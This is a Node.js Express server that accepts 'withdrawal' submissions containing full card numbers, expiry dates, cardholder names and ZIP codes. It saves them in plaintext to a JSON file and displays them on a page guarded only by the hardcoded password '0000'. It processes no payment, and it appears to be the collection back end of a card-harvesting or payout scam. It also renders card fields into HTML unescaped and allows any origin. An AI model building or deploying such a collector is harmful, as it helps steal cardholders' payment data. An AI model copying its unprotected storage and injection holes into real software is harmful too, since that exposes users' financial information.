const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'withdrawals.json');
const PASSWORD = '0000'; // Hardcoded password

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For parsing form data
app.use(cors());

// Store withdrawal data
async function saveWithdrawal(data) {
    try {
        let withdrawals = [];
        try {
            const content = await fs.readFile(DATA_FILE, 'utf8');
            withdrawals = JSON.parse(content);
        } catch (error) {
            // File doesn't exist yet or is empty, start with empty array
        }

        withdrawals.push({
            ...data,
            timestamp: new Date().toISOString()
        });

        await fs.writeFile(DATA_FILE, JSON.stringify(withdrawals, null, 2));
    } catch (error) {
        console.error('Error saving withdrawal:', error);
        throw error;
    }
}

// Generate password prompt HTML
function generatePasswordPrompt(error = '') {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Withdrawal Records - Authentication</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    background-color: #f5f5f5;
                }
                .container {
                    background-color: #ffffff;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                    text-align: center;
                }
                h1 {
                    color: #1564C0;
                }
                input[type="password"] {
                    padding: 8px;
                    margin: 10px 0;
                    border: 1px solid #1564C0;
                    border-radius: 4px;
                    width: 200px;
                }
                button {
                    padding: 8px 20px;
                    background-color: #1564C0;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #0d3e8a;
                }
                .error {
                    color: red;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Enter Password</h1>
                <form method="POST" action="/">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <br>
                    <button type="submit">Submit</button>
                </form>
                ${error ? `<p class="error">${error}</p>` : ''}
            </div>
        </body>
        </html>
    `;
}

// Generate HTML display with vertical layout
function generateHTML(withdrawals) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Withdrawal Records</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 20px;
                    background-color: #f5f5f5;
                }
                h1 {
                    color: #1564C0;
                    text-align: center;
                }
                .withdrawal-container {
                    max-width: 600px;
                    margin: 0 auto;
                }
                .withdrawal-record {
                    background-color: #ffffff;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    padding: 15px;
                    margin-bottom: 20px;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                }
                .withdrawal-record div {
                    margin: 8px 0;
                    line-height: 1.4;
                }
                .label {
                    font-weight: bold;
                    color: #1564C0;
                    display: inline-block;
                    width: 120px;
                }
                .value {
                    color: #333;
                }
            </style>
        </head>
        <body>
            <h1>Withdrawal Records</h1>
            <div class="withdrawal-container">
                ${withdrawals.map(w => `
                    <div class="withdrawal-record">
                        <div><span class="label">Timestamp:</span> <span class="value">${new Date(w.timestamp).toLocaleString()}</span></div>
                        <div><span class="label">Amount:</span> <span class="value">$${w.amount.toFixed(2)}</span></div>
                        <div><span class="label">Card Number:</span> <span class="value">${w.cardNumber}</span></div>
                        <div><span class="label">Expiration:</span> <span class="value">${w.cardExp}</span></div>
                        <div><span class="label">Name:</span> <span class="value">${w.cardName}</span></div>
                        <div><span class="label">Zip Code:</span> <span class="value">${w.zipCode}</span></div>
                    </div>
                `).join('')}
            </div>
        </body>
        </html>
    `;
}

// API endpoint to handle withdrawal submissions
app.post('/api/withdraw', async (req, res) => {
    try {
        const withdrawalData = req.body;
        
        // Basic validation
        if (!withdrawalData.amount || !withdrawalData.cardNumber || 
            !withdrawalData.cardExp || !withdrawalData.cardName || 
            !withdrawalData.zipCode) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        await saveWithdrawal(withdrawalData);
        res.json({ message: 'Withdrawal recorded successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to process withdrawal' });
    }
});

// Route to display password prompt on GET request
app.get('/', (req, res) => {
    res.send(generatePasswordPrompt());
});

// Route to handle password submission and display withdrawals
app.post('/', async (req, res) => {
    const submittedPassword = req.body.password;

    if (submittedPassword !== PASSWORD) {
        return res.send(generatePasswordPrompt('Incorrect password. Please try again.'));
    }

    try {
        let withdrawals = [];
        try {
            const content = await fs.readFile(DATA_FILE, 'utf8');
            withdrawals = JSON.parse(content);
        } catch (error) {
            // File doesn't exist yet or is empty
        }

        const html = generateHTML(withdrawals);
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading withdrawal records');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
